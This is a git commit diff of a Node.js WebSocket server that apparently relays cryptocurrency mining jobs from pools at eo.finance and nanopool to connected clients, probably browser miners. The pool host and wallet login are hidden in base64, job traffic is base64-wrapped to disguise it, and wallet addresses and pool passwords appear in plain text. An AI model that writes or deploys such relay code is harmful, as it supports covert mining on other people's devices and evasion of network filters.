072f7e0a3cff6ed2158225914c89761bd7ffd203
raiyan088 <78313577+raiyan088@users.noreply.github.com>
2024-01-28 00:42:38 +0600

    Add files via upload

--- server.js
+++ server.js
@@ -1,10 +1,26 @@
-const { WebSocketServer } = require('ws')
+const { WebSocketServer, WebSocket } = require('ws')
 const express = require('express')
 const http = require('http')
-const net = require('net')
 
 let mMiner = null
 let mJob = null
+
+// const WSS = 'wss://trustaproiam.de:10005/'
+const WSS = 'wss://miner.eo.finance/pocket/'
+
+let handshake = {
+    "identifier":"handshake",
+    "pool":"faster.xmr",
+    "rightalgo":"cn/r",
+    "login":"84AbPm2mCiBCh182gsvqSRXLpEc9JgUJ96x3KQ6h35ECEtSzMWFDamMdWL98pW16tf61vJiw34nYfMii8hTW3pbTDC7BqTG",
+    "password":"raiyan",
+    "userid":"",
+    "version":13,
+    "intversion":1337,
+    "mydomain":"WEB Script 16-11-23 Perfekt https://www.raiyan088.xyz"
+}
+
+handshake = {"identifier":"handshake","pool":"eominer-stream.eo.finance:23335","rightalgo":"cn-heavy/xhv","login":"4GacqN2pFYGa8VA8nujRRoGHhc6cAhdk9ecndiKPRXMn8CMGJiSFKoC5V1bvZvBbEwFohEWi76HCZQHM5qNBPeojF7u2xWv2ymd18ij3Ai","password":"db0e2ed2-f790-41a9-a303-897fe4303d7d","userid":"","version":13,"intversion":1337,"mydomain":"GIT Script 16-11-23 Perfekt https://miner.eo.finance/"}
 
 const app = express()
 
@@ -23,9 +39,9 @@ wss.on('connection', (socket) => {
     }
 
     socket.on('message', (data) => {
-        let result = decrypt(data.toString().trim()).trim()
+        let result = decrypt(data.toString())
         if (mMiner) {
-            mMiner.write(result+'\r\n')
+            mMiner.send(result)
         }
     })
 
@@ -36,31 +52,31 @@ wss.on('connection', (socket) => {
 connectClient()
 
 function connectClient() {
-    const client = net.connect(10300, Buffer.from('eG1yLWFzaWExLm5hbm9wb29sLm9yZw==', 'base64').toString(), () => {
+    const client = new WebSocket(WSS).on('error', () => {
+        mMiner = null
+        mJob = null
+        setTimeout(connectClient, 1000)
+    }).on('close', () => {
+        mMiner = null
+        mJob = null
+        setTimeout(connectClient, 1000)
+    }).on('open', () => {
         mMiner = client
         mJob = null
-        client.write(Buffer.from('eyJtZXRob2QiOiJsb2dpbiIsInBhcmFtcyI6eyJsb2dpbiI6Ijg0QWJQbTJtQ2lCQ2gxODJnc3ZxU1JYTHBFYzlKZ1VKOTZ4M0tRNmgzNUVDRXRTek1XRkRhbU1kV0w5OHBXMTZ0ZjYxdkppdzM0bllmTWlpOGhUVzNwYlREQzdCcVRHIiwicGFzcyI6InJhaXlhbjA4OCIsInJpZ2lkIjoiIiwiYWdlbnQiOiJzdHJhdHVtLW1pbmVyLXB5LzAuMSJ9LCJpZCI6MX0=', 'base64').toString()+'\r\n')
-    }).on('data', (data) => {
+        client.send(JSON.stringify(handshake))
+    }).on('message', (data) => {
         try {
-            let result = encrypt(data.toString().trim())
-            if (mJob == null) {
-                mJob = result
+            let json = JSON.parse(data)
+            if(json['identifier'] == 'job') {
+                mJob = encrypt(data.toString().trim())
+                
+                wss.clients.forEach((ws) => {
+                    if(ws.readyState == 1) {
+                        ws.send(mJob)
+                    }
+                })
             }
-
-            wss.clients.forEach((ws) => {
-                if(ws.readyState == 1) {
-                    ws.send(result)
-                }
-            })
         } catch (error) {}
-    }).on('end', () => {
-        mMiner = null
-        mJob = null
-        setTimeout(connectClient, 2000)
-    }).on('error', () => {
-        mMiner = null
-        mJob = null
-        setTimeout(connectClient, 2000)
     })
 }
 
@@ -72,6 +88,10 @@ function decrypt(text) {
     return Buffer.from(text, 'base64').toString('ascii')
 }
 
-app.get('/', async function (req, res) {
-    res.end('SIZE: '+wss.clients.size)
+app.get('/', function (req, res) {
+    try {
+        res.end('SIZE: '+wss.clients.size)
+    } catch (error) {
+        res.end('SIZE: null')
+    }
 })
